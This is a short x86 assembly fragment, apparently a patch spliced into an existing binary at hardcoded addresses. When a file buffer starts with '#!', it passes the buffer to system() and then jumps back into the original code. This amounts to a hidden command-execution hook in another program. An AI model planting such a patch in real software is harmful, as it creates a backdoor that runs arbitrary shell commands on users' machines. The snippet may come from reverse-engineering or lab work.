mov		EAX , 0x08048662 
jmp	    EAX #skip this part first time around
mov		AX , word ptr[EBP-0x40C] #check 2 first bytes for shabang
sub		AX , 0x2123
jnz		skip
lea     eax , [EBP-0x40A] #this is the pointer to file contents, orig address is 0x40C load to eax for syscall
push	eax
call	0x8047E93	 #call system
pop		eax
mov		EAX , 0x08048662 #back to get next line
jmp		EAX
skip: #if not equal to shabang we will go back to running normal code
pop		EAX #bring back stack to normal condition
mov		EAX , 0x0804863A 
jmp		EAX
